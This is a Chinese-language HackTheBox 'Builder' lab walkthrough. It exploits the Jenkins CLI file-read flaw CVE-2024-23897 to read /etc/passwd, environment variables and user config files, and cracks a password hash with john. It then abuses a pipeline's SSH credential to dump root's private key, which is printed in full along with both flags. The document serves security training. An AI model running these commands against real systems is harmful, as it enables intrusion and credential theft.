---
title: 'HackTheBox: Builder'
disqus: hackmd
---

HackTheBox: Builder
===

## Topic

### Lab 

<img width="345" height="252" alt="image" src="https://github.com/user-attachments/assets/91660085-5d89-4afa-82ed-72ecb5fd482e" />

1.	輸入sudo openvpn lab_iming0727.ovpn ，開啟VPN連線到HTB，並確認VPN連線的IP
 
<img width="676" height="191" alt="image" src="https://github.com/user-attachments/assets/86123e52-4040-49df-908b-4a005bc8cf63" />

2.	執行下列指令掃描靶機開啟的Port，並將結果存到ports變數。
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.10 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

<img width="718" height="82" alt="image" src="https://github.com/user-attachments/assets/373fd1e8-3fd2-44b3-8b0e-7a441d1cd37b" />
 
指令解釋
這條指令由多個部分組成，逐步進行端口掃描並處理結果。以下是每個部分的解釋：

1. nmap -p- --min-rate=1000 -T4 10.10.11.10
    -nmap: 使用 Nmap 網路掃描工具。
    --p-: 掃描所有端口（1-65535）。
    ---min-rate=1000: 設定最小速率為每秒 1000 個封包，以加快掃描速度。
    --T4: 使用 T4 設定加速掃描，增加掃描速度。

2.| grep ^[0-9]
    -|: 管道符號，用來將前一個指令的輸出作為下一個指令的輸入。
    -grep ^[0-9]: 過濾出以數字開頭的行，這些行代表發現的端口。

3.| cut -d '/' -f 1
    -cut -d '/' -f 1: 使用 '/' 作為分隔符號，取出每行的第一部分，即端口號。

4.| tr '\n' ','
    -tr '\n' ',': 將每行的換行符號替換為逗號，使端口號變成以逗號分隔的一行。

5.| sed s/,$//
    -sed s/,$//: 使用 sed 將行尾的逗號刪除。

6.ports=$(...)
    - 將上述處理過的結果賦值給變數ports`。


3.	使用下列指令利用 nmap 掃描特定的端口，並進行服務版本探測及使用預設腳本掃描。透過下列掃描結果，發現靶機中有開啟SSH and Jenkins服務。
nmap -p$ports -sV -sC 10.10.11.10

 <img width="718" height="333" alt="image" src="https://github.com/user-attachments/assets/c294fb84-3327-4100-951c-2967335fc47d" />

1. nmap
    - 使用 Nmap 網路掃描工具。

2. -p$ports
    - -p: 指定要掃描的端口。
    - $ports: 使用第一條指令生成的端口清單。

3. -sV
    - 啟用服務版本探測，以確定每個開放端口上運行的應用程序名稱和版本。

4. -sC
    - 使用 Nmap 預設腳本進行掃描，這些腳本執行常見的任務，如檢查漏洞、服務識別等。

5. 10.10.11.10
    - 要掃描的目標 IP 位址。

4.	開啟http://10.10.11.10:8080網頁，可以發現Jekins版本。

<img width="671" height="328" alt="image" src="https://github.com/user-attachments/assets/c6dc7e0b-08a8-4cdf-89aa-781d97b8259b" />
 
5.	在Goolge 中輸入關鍵字【cve jenkins 2.4.4.1】 ，可以找到可以用的漏洞。

 <img width="611" height="118" alt="image" src="https://github.com/user-attachments/assets/8fdd09bd-6ef9-4da6-a9c6-29c692190f9f" />

6.	進入到搜尋到的下列的Github網址，可以看到利用這個漏洞來下載檔案。但是直接使用這個Github的Python程式，無法順利執行。
https://github.com/Praison001/CVE-2024-23897-Jenkins-Arbitrary-Read-File-Vulnerability，
 
 <img width="563" height="345" alt="image" src="https://github.com/user-attachments/assets/7a539aa9-fd1a-4a15-b64e-233430ae9815" />

7.	繼續搜尋，可以找到下列網址中找到利用【java -jar jenkins-cli.jar -s http://10.10.11.10:8080 @/etc/passwd】指令來下載密碼檔案。
https://github.com/3yujw7njai/CVE-2024-23897

<img width="631" height="489" alt="image" src="https://github.com/user-attachments/assets/82e11ba4-ba39-410d-86c3-24d6675c9474" />

8.	參考下列網址的資料，我們發覺可以直接到靶機上下載jekins-cli.jar，及執行語法
https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client

<img width="617" height="205" alt="image" src="https://github.com/user-attachments/assets/725bdd62-5b95-4858-9eab-e7bec77b7027" />

9.	執行下列指令下載jenkins-cli.jar
wget 10.10.11.10:8080/jnlpJars/jenkins-cli.jar

<img width="625" height="105" alt="image" src="https://github.com/user-attachments/assets/b6bc659a-9877-4286-84bd-ca653e8c039b" />
 
10.	執行下列指令下載/etc/passwd，但是出現錯誤訊息。但是有出現部分應該有關使用者資訊，所以代表這個漏洞是可以利用的。
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/etc/passwd"

 <img width="659" height="137" alt="image" src="https://github.com/user-attachments/assets/e0f12aa1-3fbc-48ce-ba50-08d002e10767" />

11.	執行下列指令下載environ環境變數，可以看到環境變數，但是資料有點亂。
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/proc/self/environ"

 <img width="667" height="75" alt="image" src="https://github.com/user-attachments/assets/fbee3a79-cf8f-46ee-896d-754f698dc8c9" />

12.	複製可能是environ環境變數的內容，利用ChatGPT分析，提示詞如下
分析並整理下列Unix系統文字
HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalJAVA_HOME=/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementalsCOPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.logPWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441HOME=/var/jenkins_homeLANG=C.UTF-8JENKINS_UC=https://updates.jenkins.ioSHLVL=0JENKINS_HOME=/var/jenkins_homeREF=/usr/share/jenkins/refPATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin.
 
<img width="428" height="392" alt="image" src="https://github.com/user-attachments/assets/0b8bd839-cd4a-4e93-af7d-10c7802448ea" />

13.	根據上個步驟ChatGPT的訊息，可以得知主機名稱為亂數，這代表這個服務是架設在Docker容器，Jenkins服務所在的目錄位在/var/jenkins_home
 
 <img width="525" height="89" alt="image" src="https://github.com/user-attachments/assets/ce54a56e-d26e-4aad-9f57-f73c30402e56" />
<img width="474" height="86" alt="image" src="https://github.com/user-attachments/assets/958ed9de-3dcf-4a8b-8e62-fc269fc9a9b7" />

14.	輸入下列指令，獲得在使用者jenkins 使用者家目錄下的Flag。
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/var/jenkins_home/user.txt"
user.txt：c45872e1ad846a8abe2503846ff716d7
 
<img width="672" height="68" alt="image" src="https://github.com/user-attachments/assets/24627ed4-6b16-4651-85ef-eae2d94198d5" />

15.	因為靶機的Jenkins的服務是建立在Docker容器，所以參考下列網頁，嘗試建立一個官方Jenkins的Docker 容器，用以更加了解Docker 容器。
https://github.com/jenkinsci/docker

16.	為了避免無法安裝Jenkins容器，在安裝Jenkins容器前先執行下列指令，更新Kali
sudo apt update
17.	為了避免無法安裝Jenkins容器，在安裝Jenkins容器前先執行下列指令，升級Kali系統。
sudo apt upgrade
18.	輸入下列指令，下載jenkins容器。
docker pull jenkins/jenkins:lts-jdk17

<img width="659" height="309" alt="image" src="https://github.com/user-attachments/assets/5cb7d856-c24f-4154-8412-845dc9df42b7" />
 
19.	輸入下列指令，啟動jenkins容器。
sudo docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17

<img width="665" height="93" alt="image" src="https://github.com/user-attachments/assets/e2fc91e2-f3a0-468c-b5ee-45f0573ae27d" />

20.	在容器啟動的訊息可以看到第一次登入Jenkins伺服器的密碼

<img width="684" height="223" alt="image" src="https://github.com/user-attachments/assets/15be62a6-8325-439e-befa-b7f19924bb3b" />
 
21.	開啟FireFox，連線到http://127.0.0.1:8080/，輸入上一個步驟所得到的密碼

<img width="359" height="180" alt="image" src="https://github.com/user-attachments/assets/0e01feb9-caed-4d2d-a933-16ed9f42fbdd" />
 
22.	為了加快安裝速度，選擇自訂安裝Plugin。

 <img width="638" height="305" alt="image" src="https://github.com/user-attachments/assets/473f160e-584a-48f5-9d11-669609767358" />

23.	選擇不安裝任何Plugin

<img width="641" height="305" alt="image" src="https://github.com/user-attachments/assets/def31001-d357-4ca2-8d86-7d2d94cbe091" />
 
24.	建立一個使用者名稱為，密碼為Password，全名為Eric Lin

<img width="470" height="302" alt="image" src="https://github.com/user-attachments/assets/f55376a0-b33f-4300-8861-01575f4e7c50" />
 
25.	進行儲存設定與安裝
 
<img width="704" height="457" alt="image" src="https://github.com/user-attachments/assets/75447f20-a5b4-4be0-88d9-3b6baac977c9" />

26.	執行下列指令確認Jenkins容器的啟動狀況與容器ID
docker ps

27.	根據容器ID，執行下列指令登入到容器
docker exec -it 【容器ID】bash

<img width="718" height="147" alt="image" src="https://github.com/user-attachments/assets/60ed6bc5-5cf6-4afd-bc3e-77282bead55e" />

28.	根據容器ID，執行下列指令登入到容器
docker exec -it 【容器ID】bash

 <img width="614" height="323" alt="image" src="https://github.com/user-attachments/assets/eb62460a-cd0b-4d5b-aa4d-a91dee0576cc" />

29.	登入到Jenkins的家目錄，並列出Jenkins的家目錄的內容，並且看到有一個名稱為users的資料夾，裡面可能有存放使用者的資料。

 <img width="621" height="138" alt="image" src="https://github.com/user-attachments/assets/82554641-1665-4fdd-82b5-ed3376f1e5f9" />
<img width="613" height="237" alt="image" src="https://github.com/user-attachments/assets/b190be63-6c7b-4962-8b26-e9865ef9f570" />

30.	進入到users目錄，看到有一個目錄開頭是使用者名稱，及一個users.xml檔案。users.xml檔案內容是紀錄所在資料夾的名稱，另外使用者帳號的名稱全部改成小寫。

<img width="623" height="284" alt="image" src="https://github.com/user-attachments/assets/e46cfae7-121c-4738-a7d6-9fffe6ea8bd4" />

31.	登入http://127.0.0.1:8080，確認登入的使用者帳號。

 <img width="633" height="109" alt="image" src="https://github.com/user-attachments/assets/542f0ac8-4cf4-4e87-b9a3-e77b0c90f6fb" />
<img width="637" height="37" alt="image" src="https://github.com/user-attachments/assets/ab2fd2e6-8cc3-44c8-b8fc-a4a97934106c" />

32.	進入名稱開頭為使用者帳號的目錄，目錄中有一個檔案config.xml。檢視config.xml，可以看到欄位中有我們輸入的使用者資料，另外也看到有一個passwordHash欄位，裡面可能存放的是密碼的Hash值。

 <img width="291" height="42" alt="image" src="https://github.com/user-attachments/assets/b146cc71-b89d-4a7f-80b7-45ce1d365a10" />

33.	複製passwordHash欄位的值，然後離開容器的CLI介面。

 <img width="601" height="121" alt="image" src="https://github.com/user-attachments/assets/02f93709-53a5-4ab6-b857-591d607721d6" />

34.	將複製passwordHash欄位的值，儲存到hash.txt

 <img width="609" height="159" alt="image" src="https://github.com/user-attachments/assets/46b13646-76d6-4a91-ae3b-41cc5ce476b3" />

35.	使用john破解密碼，確認可以利用john破解Jenkins容器的使用者密碼
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
<img width="630" height="190" alt="image" src="https://github.com/user-attachments/assets/2d90213b-7ad3-4f45-ab3d-40fd4d367c2f" />


36.	使用下列指令關閉所有執行中的容器服務，並確認所有的容器服務已經停止
docker stop $(docker ps -aq)
docker ps
 
<img width="625" height="190" alt="image" src="https://github.com/user-attachments/assets/e65195de-24b6-4221-a1f1-29a653ae85e7" />

37.	使用下列指令刪除所有容器，並確認所有的容器已經被刪除
docker rm $(docker ps -aq)
docker container ls

 <img width="653" height="305" alt="image" src="https://github.com/user-attachments/assets/84ab7487-ae60-4ea4-9153-4326a3bee27e" />
<img width="451" height="111" alt="image" src="https://github.com/user-attachments/assets/72af0e2f-ac55-40d1-a0a8-2d9ebcbf5450" />

38.	使用下列指令刪除所有容器影像檔，並確認所有的容器影像檔已經被刪除
docker image ls
docker rmi $(docker images -q)

<img width="681" height="124" alt="image" src="https://github.com/user-attachments/assets/d8c808c2-a4a6-4e7f-9715-463d27c83131" />

39.	使用下列指令嘗試下載users.xml，但是失敗。
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/var/jenkins_home/users/users.xml"

 <img width="650" height="211" alt="image" src="https://github.com/user-attachments/assets/32ab366d-5881-426a-b1b7-6b2ccf419e79" />

40.	查詢說明文件，改用下列指令獲取users.xml的資訊，並得知登入帳號為jennifer及存放jennifer帳號資料所在的資料夾。
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' connect-node "@/var/jenkins_home/users/users.xml"

 <img width="659" height="108" alt="image" src="https://github.com/user-attachments/assets/7ff21923-f801-4300-ba02-c61c1ff21413" />
 <img width="662" height="76" alt="image" src="https://github.com/user-attachments/assets/e2012869-db52-4f0f-851a-bb115dbf79e0" />

41.	下載jennifer帳號資料夾中的config.xml，來獲得jennifer帳號密碼的Hash值
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"

<img width="665" height="284" alt="image" src="https://github.com/user-attachments/assets/2079c7b7-0745-4b1a-9e63-2a8f3cb783fa" />

42.	修改hash值，放到hash.txt，然後使用john破解，得知密碼為princess。
 
<img width="666" height="309" alt="image" src="https://github.com/user-attachments/assets/cb4ebf23-baaf-462a-bb57-f4999c51f7cb" />
<img width="645" height="287" alt="image" src="https://github.com/user-attachments/assets/069e9a13-f798-4fd1-b478-71a7e7fd75ef" />

43.	登入靶機的Jenkins服務網址(http://10.10.11.10:8080)。
 
<img width="660" height="261" alt="image" src="https://github.com/user-attachments/assets/afdb4dbe-987d-4367-8655-febd47791408" />
<img width="665" height="291" alt="image" src="https://github.com/user-attachments/assets/74ef3595-e7a5-4699-8652-33b624c26e03" />
 
44.	登入成功後有2種方式，可以提升權限，先介紹第一種。尋找到Credentials管理介面，確認使用者的登入資訊。

<img width="663" height="254" alt="image" src="https://github.com/user-attachments/assets/faa8dabd-7c42-4551-971f-7859f8b02b78" />

45.	到Plugins介面，確認系統有安裝哪一些Plugin

<img width="611" height="273" alt="image" src="https://github.com/user-attachments/assets/978a7b5a-ffcd-40e9-a4ee-1158c04783b2" />

46.	確認有安裝SSH Agent Plugin。

<img width="611" height="246" alt="image" src="https://github.com/user-attachments/assets/205807a3-a824-4485-a9b0-7d96fc981182" />
<img width="613" height="273" alt="image" src="https://github.com/user-attachments/assets/d0e1e78b-c548-4a32-81c0-1b76a0788c62" />
<img width="608" height="283" alt="image" src="https://github.com/user-attachments/assets/844256a1-ae53-4fad-af84-430c996e4630" />

47.	在新增的Pipeline中輸入下列程式碼。

pipeline {
    agent any
    stages {
        stage('SSH') {
            steps {
                script {
                    sshagent(credentials: ['1']) {
                        sh 'ssh -o StrictHostKeyChecking=no root@10.10.11.10 "cat /root/.ssh/id_rsa"'
                        
                    }
                    
                }
                
            }
            
        }
        
    }
    
}


 
<img width="639" height="276" alt="image" src="https://github.com/user-attachments/assets/af30113a-18fb-4d73-9789-8e35bc26d6d5" />
<img width="718" height="315" alt="image" src="https://github.com/user-attachments/assets/d9b19c99-fadb-46e3-906e-368562d9fd8b" />
 <img width="718" height="285" alt="image" src="https://github.com/user-attachments/assets/5e1253e7-b87b-46b5-9407-b9d522f31209" />

50.	檢視輸出結果，可以看到登入的私鑰內容，私鑰內容如下所示。
 
<img width="650" height="260" alt="image" src="https://github.com/user-attachments/assets/e995dabe-1b02-4f3e-beb4-aa8b70ff4b3f" />

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

51.	複製私鑰。
 
<img width="661" height="322" alt="image" src="https://github.com/user-attachments/assets/67c7e77f-dbed-480e-9eef-3fe4f8469432" />

52.	將私鑰內容放到pk.txt。
 
<img width="610" height="462" alt="image" src="https://github.com/user-attachments/assets/b1c3177c-26ba-46a2-bc1d-4dca06acd212" />

53.	設定pk.txt權限，並利用pk.txt，以root身分利用SSH登入系統。
 
<img width="361" height="115" alt="image" src="https://github.com/user-attachments/assets/caa47271-957c-4d58-86bb-49ff61118864" />

54.	確認登入帳號，並印出root.txt的Flag內容。
eac7b0b0e72fdb3bd19819ffce449f6f
 
<img width="337" height="91" alt="image" src="https://github.com/user-attachments/assets/21cdda4b-f72b-4cc5-b9cb-c1c95ae23b70" />
